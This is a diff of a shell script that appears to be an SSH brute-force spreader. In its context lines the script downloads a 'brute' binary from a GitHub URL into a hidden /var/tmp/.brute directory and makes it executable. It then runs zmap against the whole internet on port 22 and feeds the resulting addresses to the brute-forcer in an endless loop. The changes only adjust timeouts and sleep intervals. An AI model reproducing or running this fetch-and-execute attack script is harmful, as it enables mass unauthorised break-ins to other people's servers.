@@ -4,6 +4,9 @@
 brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
 url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'
 
+
+
+
 brute(){
 
 cd /var/tmp  ; cd .brute
@@ -12,13 +15,15 @@ wget $brute_url  -O brute || curl  -L $brute_url -o brute
 
 chmod 777 brute && chmod 777 zmap
 
-timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
+timeout   5s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
 
-timeout   120s    ./brute  #120 segundos para  testa o   ip
+timeout   50s    ./brute  #120 segundos para  testa o   ip
 
 return
 
 }
+
+
 
 
 #################################
@@ -92,7 +97,7 @@ while true ; do
 
 install_zmap
  
-sleep   1
+sleep   5
 
 done
 
